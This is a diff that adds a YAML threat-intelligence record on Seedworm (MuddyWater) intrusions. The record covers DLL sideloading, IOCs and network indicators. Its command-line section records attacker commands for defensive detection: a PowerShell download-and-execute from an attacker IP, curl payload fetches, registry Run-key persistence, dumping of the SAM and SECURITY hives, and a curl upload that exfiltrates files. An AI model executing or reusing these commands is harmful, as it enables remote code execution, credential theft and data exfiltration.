@@ -1,0 +1,79 @@
+title: 'Seedworm: Iran-Linked Hackers Breached Korean Electronics Maker in Global
+  Spying Campaign'
+description: Seedworm, an Iranian-linked threat actor, abused signed Fortemedia and
+  SentinelOne binaries for DLL sideloading and exfiltrated data through a public file-transfer
+  service.
+attribution: Seedworm (aka MuddyWater, Temp Zagros, Static Kitten)
+malware_families:
+- Seedling
+cves: []
+ttps:
+  processes:
+  - fmapp.exe
+  - sentinelmemoryscanner.exe
+  - node.exe
+  - powershell.exe
+  - curl.exe
+  - reg.exe
+  - cmd.exe
+  command_lines:
+  - powershell -NoProfile -Command "iex (New-Object Net.WebClient).DownloadString('http://179.43.177[.]220:8080/nm.ps1')"
+  - curl.exe -o CSIDL_PROFILE\appdata\local\[RANDOM]\a.dat http://179.43.177[.]220:8080/a.dat
+  - curl.exe -o CSIDL_PROFILE\appdata\local\[RANDOM]\a.exe http://179.43.177[.]220:8080/a.exe
+  - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v [RANDOM] /t REG_SZ
+    /d "CSIDL_PROFILE\appdata\local\[RANDOM]\fmapp.exe" /f
+  - reg save hklm\sam C:\Windows\Temp\sam.save /y
+  - reg save hklm\security C:\Windows\Temp\security.save /y
+  - reg save hklm\system C:\Windows\Temp\system.save /y
+  - powershell -NoProfile -Command "(Invoke-WebRequest -UseBasicParsing http://ipinfo.io/json).Content"
+  - curl.exe -F "file=@C:\Windows\Temp\<artifact>" https://sendit.sh
+  powershell:
+  - iex (New-Object Net.WebClient).DownloadString('http://179.43.177[.]220:8080/nm.ps1')
+  - (Invoke-WebRequest -UseBasicParsing http://ipinfo.io/json).Content
+  scripts:
+  - sp.ps1
+  registry_keys: []
+  image_loads:
+  - fmapp.dll
+  - sentinelagentcore.dll
+  - example.dll
+  network_connections:
+  - node.exe -> 179.43.177[.]220:8080
+  - curl.exe -> 179.43.177[.]220:8080
+  - powershell.exe -> ipinfo.io:80
+  - curl.exe -> sendit.sh:443
+  file_activity: []
+  persistence:
+  - Registry Run key (HKCU) pointing at CSIDL_PROFILE\\appdata\\local\\[RANDOM]\\fmapp.exe
+  process_relations: []
+iocs:
+  hashes:
+  - e25892603c42e34bd7ba0d8ea73be600d898cadc290e3417a82c04d6281b743b
+  - c6182fd01b14d84723e3c9d11bc0e16b34de6607ccb8334fc9bb97c1b44f0cde
+  - 128b58a2a2f1df66c474094aacb7e50189025fbf45d7cd8e0834e93a8fbed667
+  - 0c9b911935a3705b0ad569446804d80026feb6db3884aeb240b6c76e9b8cf139
+  - 74ab3838ebed7054b2254bf7d334c80c8b2cfec4a97d1706723f8ea55f11061f
+  - 3ee7dab4ae4f6d4f16dfabb6f38faef370411a9fc00ff035844e54703b99600a
+  - bee79c3302b1a7afc0952842d14eff83a604ef00bfdae525176c16c80b2045f7
+  - d587959841a763669279ad831b8f0379f6a7b037dffc19deab5d41f37f8b5ffc
+  - b21c802775df0c0d82c8cfde299084abc624898b10258db641b820172a0ba29a
+  ip_addresses:
+  - 179.43.177[.]220
+  - 178.128.233[.]36
+  - 172.67.156[.]47
+  - 104.21.48[.]205
+  - 37.187.78[.]41
+  - 34.117.59[.]81
+  domains:
+  - timetrakr[.]cloud
+  - sendit[.]sh
+  urls:
+  - http://179.43.177[.]220:8080/nm.ps1
+  - http://179.43.177[.]220:8080/a.dat
+  - http://179.43.177[.]220:8080/a.exe
+  - http://ipinfo.io/json
+  - https://sendit.sh
+authors: []
+reference: https://www.security.com/threat-intelligence/iran-seedworm-electronics
+date_of_publication: May 20, 2026
+file_creation_date: May 20, 2026
